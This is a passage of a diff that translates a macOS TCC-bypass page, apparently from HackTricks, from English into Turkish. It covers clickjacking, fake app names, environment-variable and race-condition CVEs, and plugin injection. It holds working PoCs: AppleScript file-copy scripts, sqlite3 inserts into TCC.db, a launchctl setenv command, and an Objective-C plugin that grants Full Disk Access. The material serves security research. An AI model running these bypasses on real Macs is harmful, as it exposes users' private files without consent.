@@ -1,13 +1,12 @@
-# macOS TCC Bypasses
+# macOS TCC Bypass'ları
 
 {{#include ../../../../../banners/hacktricks-training.md}}
 
-## By functionality
+## İşlevselliğe göre
 
-### Write Bypass
+### Yazma Bypass'ı
 
-This is not a bypass, it's just how TCC works: **It doesn't protect from writing**. If Terminal **doesn't have access to read the Desktop of a user it can still write into it**:
-
+Bu bir bypass değil, TCC'nin nasıl çalıştığıdır: **Yazma işlemlerini korumaz**. Eğer Terminal **bir kullanıcının Masaüstünü okumak için erişime sahip değilse, yine de oraya yazabilir**:
 ```shell-session
 username@hostname ~ % ls Desktop
 ls: Desktop: Operation not permitted
@@ -17,23 +16,22 @@ ls: Desktop: Operation not permitted
 username@hostname ~ % cat Desktop/lalala
 asd
 ```
-
-The **extended attribute `com.apple.macl`** is added to the new **file** to give the **creators app** access to read it.
+**Genişletilmiş özellik `com.apple.macl`**, yeni **dosyaya** eklenir ve **yaratıcı uygulama**'nın onu okuma erişimi olmasını sağlar.
 
 ### TCC ClickJacking
 
-It's possible to **put a window over the TCC prompt** to make the user **accept** it without noticing. You can find a PoC in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**
+Kullanıcının **kabul etmesini sağlamak için TCC isteminin üzerine bir pencere koymak** mümkündür. Bir PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**'de bulabilirsiniz.**
 
 <figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>
 
-### TCC Request by arbitrary name
+### TCC İsteği rastgele isimle
 
-Attacker can **create apps with any name** (e.g. Finder, Google Chrome...) in the **`Info.plist`** and make it request access to some TCC protected location. The user will think that the legit application is the one requesting this access.\
-Moreover, it's possible to **remove the legit app from the Dock and put the fake one on it**, so when the user clicks on the fake one (which can use the same icon) it could call the legit one, ask for TCC permissions and execute a malware, making the user believe the legit app requested the access.
+Saldırgan, **`Info.plist`** dosyasında **herhangi bir isimle uygulama oluşturabilir** (örneğin Finder, Google Chrome...) ve bunu bazı TCC korumalı konumlara erişim istemesi için ayarlayabilir. Kullanıcı, bu erişimi talep eden uygulamanın meşru olduğunu düşünecektir.\
+Ayrıca, **meşru uygulamayı Dock'tan kaldırmak ve sahte olanı yerleştirmek** mümkündür, böylece kullanıcı sahte olanı tıkladığında (aynı simgeyi kullanabilir) meşru olanı çağırabilir, TCC izinlerini isteyebilir ve bir kötü amaçlı yazılım çalıştırabilir, bu da kullanıcının meşru uygulamanın erişim talep ettiğine inanmasına neden olur.
 
 <figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>
 
-More info and PoC in:
+Daha fazla bilgi ve PoC için:
 
 {{#ref}}
 ../../../macos-privilege-escalation.md
@@ -41,69 +39,66 @@ More info and PoC in:
 
 ### SSH Bypass
 
-By default an access via **SSH used to have "Full Disk Access"**. In order to disable this you need to have it listed but disabled (removing it from the list won't remove those privileges):
+Varsayılan olarak, **SSH üzerinden erişim "Tam Disk Erişimi"** gerektiriyordu. Bunu devre dışı bırakmak için, listede yer alması ancak devre dışı bırakılması gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):
 
 ![](<../../../../../images/image (1077).png>)
 
-Here you can find examples of how some **malwares have been able to bypass this protection**:
+Bazı **kötü amaçlı yazılımların bu korumayı aşmayı başardığına dair örnekler** burada bulabilirsiniz:
 
 - [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)
 
 > [!CAUTION]
-> Note that now, in order to be able to enable SSH you need **Full Disk Access**
+> Artık SSH'yi etkinleştirmek için **Tam Disk Erişimi** gerektiğini unutmayın.
 
 ### Handle extensions - CVE-2022-26767
 
-The attribute **`com.apple.macl`** is given to files to give a **certain application permissions to read it.** This attribute is set when **drag\&drop** a file over an app, or when a user **double-clicks** a file to open it with the **default application**.
+**`com.apple.macl`** özelliği, dosyalara **belirli bir uygulamanın okuma izni vermek için** verilir. Bu özellik, bir dosyayı bir uygulamanın üzerine **sürükleyip bıraktığınızda** veya bir kullanıcı bir dosyayı **çift tıkladığında** varsayılan uygulama ile açmak için ayarlanır.
 
-Therefore, a user could **register a malicious app** to handle all the extensions and call Launch Services to **open** any file (so the malicious file will be granted access to read it).
+Bu nedenle, bir kullanıcı **tüm uzantıları işlemek için kötü amaçlı bir uygulama kaydedebilir** ve herhangi bir dosyayı **açmak için** Launch Services'i çağırabilir (böylece kötü amaçlı dosya okuma erişimi alacaktır).
 
 ### iCloud
 
-The entitlement **`com.apple.private.icloud-account-access`** it's possible to communicate with **`com.apple.iCloudHelper`** XPC service which will **provide iCloud tokens**.
+**`com.apple.private.icloud-account-access`** yetkisi ile **`com.apple.iCloudHelper`** XPC servisi ile iletişim kurmak mümkündür, bu da **iCloud token'ları** sağlayacaktır.
 
-**iMovie** and **Garageband** had this entitlement and others that allowed.
+**iMovie** ve **Garageband** bu yetkiye sahipti ve diğerleri de izin verdi.
 
-For more **information** about the exploit to **get icloud tokens** from that entitlement check the talk: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
+Bu yetkiden **icloud token'ları almak için** istismara dair daha fazla **bilgi** için konuşmayı kontrol edin: [**#OBTS v5.0: "Mac'inizde Olan, Apple'ın iCloud'unda Kalır?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)
 
 ### kTCCServiceAppleEvents / Automation
 
-An app with the **`kTCCServiceAppleEvents`** permission will be able to **control other Apps**. This means that it could be able to **abuse the permissions granted to the other Apps**.
+**`kTCCServiceAppleEvents`** iznine sahip bir uygulama, **diğer Uygulamaları kontrol edebilecektir**. Bu, diğer Uygulamalara verilen izinleri **suistimal edebileceği** anlamına gelir.
 
-For more info about Apple Scripts check:
+Apple Script'leri hakkında daha fazla bilgi için kontrol edin:
 
 {{#ref}}
 macos-apple-scripts.md
 {{#endref}}
 
-For example, if an App has **Automation permission over `iTerm`**, for example in this example **`Terminal`** has access over iTerm:
+Örneğin, bir Uygulama **`iTerm`** üzerinde **Otomasyon iznine** sahipse, bu örnekte **`Terminal`** iTerm üzerinde erişime sahiptir:
 
 <figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>
 
-#### Over iTerm
+#### iTerm Üzerinde
 
-Terminal, who doesn't have FDA, can call iTerm, which has it, and use it to perform actions:
-
+FDA'ya sahip olmayan Terminal, iTerm'i çağırabilir, bu da ona sahip ve eylemleri gerçekleştirmek için kullanılabilir:
 ```applescript:iterm.script
 tell application "iTerm"
-    activate
-    tell current window
-        create tab with default profile
-    end tell
-    tell current session of current window
-        write text "cp ~/Desktop/private.txt /tmp"
-    end tell
+activate
+tell current window
+create tab with default profile
+end tell
+tell current session of current window
+write text "cp ~/Desktop/private.txt /tmp"
+end tell
 end tell
 ```
 
 ```bash
 osascript iterm.script
 ```
+#### Finder Üzerinden
 
-#### Over Finder
-
-Or if an App has access over Finder, it could a script such as this one:
-
+Ya da bir Uygulama Finder üzerinde erişime sahipse, bu gibi bir script olabilir:
 ```applescript
 set a_user to do shell script "logname"
 tell application "Finder"
@@ -113,17 +108,15 @@ set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alia
 end tell
 do shell script "rm " & POSIX path of (copyFile as alias)
 ```
-
-## By App behaviour
+## Uygulama davranışına göre
 
 ### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>
 
-The userland **tccd daemon** what using the **`HOME`** **env** variable to access the TCC users database from: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**
+Kullanıcı alanındaki **tccd daemon** **`HOME`** **env** değişkenini **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** adresinden TCC kullanıcı veritabanına erişmek için kullanıyor.
 
-According to [this Stack Exchange post](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) and because the TCC daemon is running via `launchd` within the current user’s domain, it's possible to **control all environment variables** passed to it.\
-Thus, an **attacker could set `$HOME` environment** variable in **`launchctl`** to point to a **controlled** **directory**, **restart** the **TCC** daemon, and then **directly modify the TCC database** to give itself **every TCC entitlement available** without ever prompting the end user.\
+[Tam Stack Exchange gönderisine](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) göre ve TCC daemon'u mevcut kullanıcının alanında `launchd` aracılığıyla çalıştığı için, ona iletilen **tüm ortam değişkenlerini kontrol etmek** mümkündür.\
+Bu nedenle, bir **saldırgan `$HOME` ortam** değişkenini **`launchctl`** içinde **kontrol edilen** bir **dizine** işaret edecek şekilde ayarlayabilir, **TCC** daemon'unu **yeniden başlatabilir** ve ardından **TCC veritabanını doğrudan değiştirebilir** ve kendisine **mevcut tüm TCC yetkilerini** verebilir, son kullanıcıdan herhangi bir onay almadan.\
 PoC:
-
 ```bash
 # reset database just in case (no cheating!)
 $> tccutil reset All
@@ -138,105 +131,102 @@ $> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
 # print out contents of TCC database and then give Terminal access to Documents
 $> sqlite3 TCC.db .dump
 $> sqlite3 TCC.db "INSERT INTO access
-                   VALUES('kTCCServiceSystemPolicyDocumentsFolder',
-                   'com.apple.Terminal', 0, 1, 1,
+VALUES('kTCCServiceSystemPolicyDocumentsFolder',
+'com.apple.Terminal', 0, 1, 1,
 X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
-                   NULL,
-                   NULL,
-                   'UNUSED',
-                   NULL,
-                   NULL,
-                   1333333333333337);"
+NULL,
+NULL,
+'UNUSED',
+NULL,
+NULL,
+1333333333333337);"
 # list Documents directory without prompting the end user
 $> ls ~/Documents
 ```
+### CVE-2021-30761 - Notlar
 
-### CVE-2021-30761 - Notes
-
-Notes had access to TCC protected locations but when a note is created this is **created in a non-protected location**. So, you could ask notes to copy a protected file in a noe (so in a non-protected location) and then access the file:
+Notlar TCC korumalı konumlara erişime sahipti ancak bir not oluşturulduğunda bu **korumasız bir konumda** **oluşturuluyor**. Bu nedenle, notlardan korunan bir dosyayı bir notta (yani korumasız bir konumda) kopyalamasını isteyebilir ve ardından dosyaya erişebilirsiniz:
 
 <figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>
 
-### CVE-2021-30782 - Translocation
+### CVE-2021-30782 - Translokasyon
 
-The binary `/usr/libexec/lsd` with the library `libsecurity_translocate` had the entitlement `com.apple.private.nullfs_allow` which allowed it to crate **nullfs** mount and had the entitlement `com.apple.private.tcc.allow` with **`kTCCServiceSystemPolicyAllFiles`** to access every file.
+`/usr/libexec/lsd` ikili dosyası, `libsecurity_translocate` kütüphanesi ile birlikte `com.apple.private.nullfs_allow` yetkisine sahipti, bu da **nullfs** montajı oluşturmasına izin veriyordu ve her dosyaya erişim için **`kTCCServiceSystemPolicyAllFiles`** ile **`com.apple.private.tcc.allow`** yetkisine sahipti.
 
-It was possible to add the quarantine attribute to "Library", call the **`com.apple.security.translocation`** XPC service and then it would map Library to **`$TMPDIR/AppTranslocation/d/d/Library`** where all the documents inside Library could be **accessed**.
+"Library" klasörüne karantina niteliği eklemek, **`com.apple.security.translocation`** XPC hizmetini çağırmak mümkün oldu ve ardından Library, **`$TMPDIR/AppTranslocation/d/d/Library`** olarak haritalandı; burada Library içindeki tüm belgeler **erişilebilir** hale geldi.
 
-### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>
+### CVE-2023-38571 - Müzik & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>
 
-**`Music`** has an interesting feature: When it's running, it will **import** the files dropped to **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** into the user's "media library". Moreover, it calls something like: **`rename(a, b);`** where `a` and `b` are:
+**`Music`** ilginç bir özelliğe sahiptir: Çalıştığında, **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** konumuna bırakılan dosyaları kullanıcının "medya kütüphanesine" **ithal** eder. Ayrıca, **`rename(a, b);`** gibi bir şey çağırır; burada `a` ve `b` şunlardır:
 
 - `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
-- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3`
+- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`
 
-This **`rename(a, b);`** bevabiour is vulnerable to a **Race Condition**, as it's possible to put inside the `Automatically Add to Music.localized` folder a fake **TCC.db** file and then when the new forder(b) is created to copy the file, delete it, and point it to **`~/Library/Application Support/com.apple.TCC`**/.
+Bu **`rename(a, b);`** davranışı bir **Race Condition**'a karşı savunmasızdır, çünkü `Automatically Add to Music.localized` klasörüne sahte bir **TCC.db** dosyası yerleştirmek ve ardından yeni klasör (b) oluşturulduğunda dosyayı kopyalayıp silmek ve **`~/Library/Application Support/com.apple.TCC`**'ye işaret etmek mümkündür.
 
 ### SQLITE_SQLLOG_DIR - CVE-2023-32422
 
-If **`SQLITE_SQLLOG_DIR="path/folder"`** basically means that **any open db is copied to that path**. In this CVE this control was abused to **write** inside a **SQLite database** that is going to be **open by a process with FDA the TCC database**, and then abuse **`SQLITE_SQLLOG_DIR`** with a **symlink in the filename** so when that database is **open**, the user **TCC.db is overwritten** with the opened one.\
-**More info** [**in the writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **and**[ **in the talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).
+Eğer **`SQLITE_SQLLOG_DIR="path/folder"`** ise, bu temelde **her açık veritabanının o yola kopyalanması** anlamına gelir. Bu CVE'de bu kontrol, **TCC veritabanını FDA ile açacak bir süreç içinde** **SQLite veritabanına yazmak** için kötüye kullanıldı ve ardından **`SQLITE_SQLLOG_DIR`** ile dosya adında bir **symlink** kullanılarak, o veritabanı **açıldığında**, kullanıcı **TCC.db** açılanla **üst üste yazıldı**.\
+**Daha fazla bilgi** [**yazıda**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **ve** [**sohbette**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).
 
 ### **SQLITE_AUTO_TRACE**
 
-If the environment variable **`SQLITE_AUTO_TRACE`** is set, the library **`libsqlite3.dylib`** will start **logging** all the SQL queries. Many applications used this library, so it was possible to log all their SQLite queries.
+Eğer ortam değişkeni **`SQLITE_AUTO_TRACE`** ayarlanmışsa, **`libsqlite3.dylib`** kütüphanesi tüm SQL sorgularını **kaydetmeye** başlayacaktır. Birçok uygulama bu kütüphaneyi kullandığı için, tüm SQLite sorgularını kaydetmek mümkündü.
 
-Several Apple applications used this library to access TCC protected information.
-
+Birçok Apple uygulaması, TCC korumalı bilgilere erişmek için bu kütüphaneyi kullandı.
 ```bash
 # Set this env variable everywhere
 launchctl setenv SQLITE_AUTO_TRACE 1
 ```
-
 ### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407
 
-This **env variable is used by the `Metal` framework** which is a dependency to various programs, most notably `Music`, which has FDA.
+Bu **env değişkeni `Metal` çerçevesi tarafından kullanılır** ve çeşitli programlar için bir bağımlılıktır, en önemlisi FDA'ya sahip olan `Music` programıdır.
 
-Setting the following: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. If `path` is a valid directory, the bug will trigger and we can use `fs_usage` to see what is going on in the program:
+Aşağıdakileri ayarlamak: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Eğer `path` geçerli bir dizinse, hata tetiklenecek ve programda neler olduğunu görmek için `fs_usage` kullanabiliriz:
 
-- a file will be `open()`ed, called `path/.dat.nosyncXXXX.XXXXXX` (X is random)
-- one or more `write()`s will write the contents to the file (we do not control this)
-- `path/.dat.nosyncXXXX.XXXXXX` will be `renamed()`d to `path/name`
+- `path/.dat.nosyncXXXX.XXXXXX` (X rastgele) adında bir dosya `open()` edilecektir.
+- Bir veya daha fazla `write()` dosyaya içerik yazacaktır (bunu kontrol edemiyoruz).
+- `path/.dat.nosyncXXXX.XXXXXX` `renamed()` olacak ve `path/name` olarak değiştirilecektir.
 
-It's a temporary file write, followed by a **`rename(old, new)`** **which is not secure.**
+Bu geçici bir dosya yazımıdır, ardından **`rename(old, new)`** **güvenli değildir.**
 
-It's not secure because it has to **resolve the old and new paths separately**, which can take some time and can be vulenrable to a Race Condition. For more information you can check out the `xnu` function `renameat_internal()`.
+Güvenli değildir çünkü **eski ve yeni yolları ayrı ayrı çözmesi gerekir**, bu da biraz zaman alabilir ve bir Yarış Koşuluna karşı savunmasız olabilir. Daha fazla bilgi için `xnu` fonksiyonu `renameat_internal()`'a bakabilirsiniz.
 
 > [!CAUTION]
-> So, basically, if a privileged process is renaming from a folder you control, you could win a RCE and make it access a different file or, like in this CVE, open the file the privileged app created and store a FD.
+> Yani, temelde, eğer ayrıcalıklı bir işlem kontrol ettiğiniz bir klasörden yeniden adlandırıyorsa, bir RCE kazanabilir ve farklı bir dosyaya erişmesini sağlayabilirsiniz veya bu CVE'de olduğu gibi, ayrıcalıklı uygulamanın oluşturduğu dosyayı açıp bir FD saklayabilirsiniz.
 >
-> If the rename access a folder you control, while you have modified the source file or has a FD to it, you change the destination file (or folder) to point a symlink, so you can write whenever you want.
+> Eğer yeniden adlandırma, kontrol ettiğiniz bir klasöre erişirse, kaynak dosyayı değiştirdiğiniz veya ona bir FD sahip olduğunuz sürece, hedef dosyayı (veya klasörü) bir symlink'e işaret edecek şekilde değiştirebilirsiniz, böylece istediğiniz zaman yazabilirsiniz.
 
-This was the attack in the CVE: For example, to overwrite the user's `TCC.db`, we can:
+CVE'deki saldırı buydu: Örneğin, kullanıcının `TCC.db` dosyasını üzerine yazmak için şunları yapabiliriz:
 
-- create `/Users/hacker/ourlink` to point to `/Users/hacker/Library/Application Support/com.apple.TCC/`
-- create the directory `/Users/hacker/tmp/`
-- set `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
-- trigger the bug by running `Music` with this env var
-- catch the `open()` of `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X is random)
-  - here we also `open()` this file for writing, and hold on to the file descriptor
-- atomically switch `/Users/hacker/tmp` with `/Users/hacker/ourlink` **in a loop**
-  - we do this to maximize our chances of succeeding as the race window is pretty slim, but losing the race has negligible downside
-- wait a bit
-- test if we got lucky
-  - if not, run again from the top
+- `/Users/hacker/ourlink` oluşturup `/Users/hacker/Library/Application Support/com.apple.TCC/`'ye işaret ettirmek
+- `/Users/hacker/tmp/` dizinini oluşturmak
+- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` ayarlamak
+- bu env değişkeni ile `Music` çalıştırarak hatayı tetiklemek
+- `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X rastgele) dosyasının `open()` işlemini yakalamak
+- burada bu dosyayı yazma için de `open()` ediyoruz ve dosya tanımlayıcısını tutuyoruz
+- `/Users/hacker/tmp` ile `/Users/hacker/ourlink`'i **bir döngü içinde atomik olarak değiştiriyoruz**
+- bunu, yarış penceresi oldukça dar olduğu için başarılı olma şansımızı artırmak için yapıyoruz, ancak yarışı kaybetmenin önemsiz bir dezavantajı var
+- biraz beklemek
+- şansımızı test etmek
+- eğer olmadıysa, en baştan tekrar çalıştırmak
 
-More info in [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)
+Daha fazla bilgi için [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)
 
 > [!CAUTION]
-> Now, if you try to use the env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE` apps won't launch
+> Şimdi, `MTL_DUMP_PIPELINES_TO_JSON_FILE` env değişkenini kullanmaya çalışırsanız, uygulamalar başlatılmayacaktır.
 
 ### Apple Remote Desktop
 
-As root you could enable this service and the **ARD agent will have full disk access** which could then be abused by a user to make it copy a new **TCC user database**.
+Root olarak bu hizmeti etkinleştirebilir ve **ARD ajanı tam disk erişimine sahip olacaktır**; bu da bir kullanıcı tarafından yeni bir **TCC kullanıcı veritabanı** kopyalamak için kötüye kullanılabilir.
 
-## By **NFSHomeDirectory**
+## **NFSHomeDirectory** ile
 
-TCC uses a database in the user's HOME folder to control access to resources specific to the user at **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
-Therefore, if the user manages to restart TCC with a $HOME env variable pointing to a **different folder**, the user could create a new TCC database in **/Library/Application Support/com.apple.TCC/TCC.db** and trick TCC to grant any TCC permission to any app.
+TCC, kullanıcının kaynaklara erişimini kontrol etmek için kullanıcının HOME klasöründe bir veritabanı kullanır **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
+Bu nedenle, eğer kullanıcı TCC'yi farklı bir klasöre işaret eden bir $HOME env değişkeni ile yeniden başlatmayı başarırsa, kullanıcı **/Library/Application Support/com.apple.TCC/TCC.db** içinde yeni bir TCC veritabanı oluşturabilir ve TCC'yi herhangi bir uygulamaya herhangi bir TCC izni vermesi için kandırabilir.
 
 > [!TIP]
-> Note that Apple uses the setting stored within the user's profile in the **`NFSHomeDirectory`** attribute for the **value of `$HOME`**, so if you compromise an application with permissions to modify this value (**`kTCCServiceSystemPolicySysAdminFiles`**), you can **weaponize** this option with a TCC bypass.
+> Apple'ın, **`NFSHomeDirectory`** niteliğindeki kullanıcının profilinde saklanan ayarı **`$HOME`** değeri için kullandığını unutmayın, bu nedenle bu değeri değiştirme iznine sahip bir uygulamayı ele geçirirseniz (**`kTCCServiceSystemPolicySysAdminFiles`**), bu seçeneği bir TCC bypass ile **silahlandırabilirsiniz**.
 
 ### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>
 
@@ -244,45 +234,44 @@ Therefore, if the user manages to restart TCC with a $HOME env variable pointing
 
 ### CVE-2021-30970 - Powerdir
 
-The **first POC** uses [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) and [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) to modify the **HOME** folder of the user.
+**İlk POC**, kullanıcının **HOME** klasörünü değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.
 
-1. Get a _csreq_ blob for the target app.
-2. Plant a fake _TCC.db_ file with required access and the _csreq_ blob.
-3. Export the user’s Directory Services entry with [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
-4. Modify the Directory Services entry to change the user’s home directory.
-5. Import the modified Directory Services entry with [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
-6. Stop the user’s _tccd_ and reboot the process.
+1. Hedef uygulama için bir _csreq_ blob alın.
+2. Gerekli erişim ve _csreq_ blob ile sahte bir _TCC.db_ dosyası yerleştirin.
+3. Kullanıcının Dizin Servisleri kaydını [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile dışa aktarın.
+4. Kullanıcının ana dizinini değiştirmek için Dizin Servisleri kaydını değiştirin.
+5. Değiştirilen Dizin Servisleri kaydını [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile içe aktarın.
+6. Kullanıcının _tccd_ sürecini durdurun ve süreci yeniden başlatın.
 
-The second POC used **`/usr/libexec/configd`** which had `com.apple.private.tcc.allow` with the value `kTCCServiceSystemPolicySysAdminFiles`.\
-It was possible to run **`configd`** with the **`-t`** option, an attacker could specify a **custom Bundle to load**. Therefore, the exploit **replaces** the **`dsexport`** and **`dsimport`** method of changing the user’s home directory with a **`configd` code injection**.
+İkinci POC, `com.apple.private.tcc.allow` değeri `kTCCServiceSystemPolicySysAdminFiles` olan **`/usr/libexec/configd`** kullanmıştır.\
+**`-t`** seçeneği ile **`configd`** çalıştırmak mümkün olduğundan, bir saldırgan **yüklemek için özel bir Bundle** belirtebilir. Bu nedenle, istismar **kullanıcının ana dizinini değiştirmek için** **`dsexport`** ve **`dsimport`** yöntemini **`configd` kod enjeksiyonu** ile değiştirmiştir.
 
-For more info check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).
+Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) bakabilirsiniz.
 
-## By process injection
+## Süreç enjeksiyonu ile
 
-There are different techniques to inject code inside a process and abuse its TCC privileges:
+Bir süreç içine kod enjekte etmenin ve TCC ayrıcalıklarını kötüye kullanmanın farklı teknikleri vardır:
 
 {{#ref}}
 ../../../macos-proces-abuse/
 {{#endref}}
 
-Moreover, the most common process injection to bypass TCC found is via **plugins (load library)**.\
-Plugins are extra code usually in the form of libraries or plist, that will be **loaded by the main application** and will execute under its context. Therefore, if the main application had access to TCC restricted files (via granted permissions or entitlements), the **custom code will also have it**.
+Ayrıca, TCC'yi atlatmak için bulunan en yaygın süreç enjeksiyonu **pluginler (load library)** aracılığıyladır.\
+Pluginler, genellikle kütüphaneler veya plist biçiminde olan ek kodlardır ve **ana uygulama tarafından yüklenir** ve onun bağlamında çalıştırılır. Bu nedenle, ana uygulama TCC kısıtlı dosyalara (verilen izinler veya haklar aracılığıyla) erişime sahipse, **özel kod da buna sahip olacaktır**.
 
 ### CVE-2020-27937 - Directory Utility
 
-The application `/System/Library/CoreServices/Applications/Directory Utility.app` had the entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, loaded plugins with **`.daplug`** extension and **didn't have the hardened** runtime.
+`/System/Library/CoreServices/Applications/Directory Utility.app` uygulaması **`kTCCServiceSystemPolicySysAdminFiles`** yetkisine sahipti, **`.daplug`** uzantılı pluginler yükledi ve **sertleştirilmiş** çalışma zamanı yoktu.
 
-In order to weaponize this CVE, the **`NFSHomeDirectory`** is **changed** (abusing the previous entitlement) in order to be able to **take over the users TCC databas**e to bypass TCC.
+Bu CVE'yi silahlandırmak için, **`NFSHomeDirectory`** **değiştirilir** (önceki yetkiden yararlanarak) böylece kullanıcıların TCC veritabanını ele geçirebiliriz ve TCC'yi atlatabiliriz.
 
-For more info check the [**original report**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).
+Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) bakabilirsiniz.
 
 ### CVE-2020-29621 - Coreaudiod
 
-The binary **`/usr/sbin/coreaudiod`** had the entitlements `com.apple.security.cs.disable-library-validation` and `com.apple.private.tcc.manager`. The first **allowing code injection** and second one giving it access to **manage TCC**.
+İkili **`/usr/sbin/coreaudiod`** `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` yetkilerine sahipti. İlk **kod enjeksiyonuna izin verirken** ikincisi **TCC'yi yönetme** erişimi sağlıyordu.
 
-This binary allowed to load **third party plug-ins** from the folder `/Library/Audio/Plug-Ins/HAL`. Therefore, it was possible to **load a plugin and abuse the TCC permissions** with this PoC:
-
+Bu ikili, `/Library/Audio/Plug-Ins/HAL` klasöründen **üçüncü taraf eklentileri** yüklemeye izin veriyordu. Bu nedenle, bir eklenti yüklemek ve bu PoC ile TCC izinlerini kötüye kullanmak mümkündü:
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <Security/Security.h>
@@ -290,40 +279,38 @@ This binary allowed to load **third party plug-ins** from the folder `/Library/A
 extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);
 
 void add_tcc_entry() {
-    CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
+CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");
 
-    CFStringRef bundleID = CFSTR("com.apple.Terminal");
-    CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
-    SecRequirementRef requirement = NULL;
-    SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
-    CFDataRef requirementData = NULL;
-    SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
+CFStringRef bundleID = CFSTR("com.apple.Terminal");
+CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
+SecRequirementRef requirement = NULL;
+SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
+CFDataRef requirementData = NULL;
+SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);
 
-    TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
+TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
 }
 
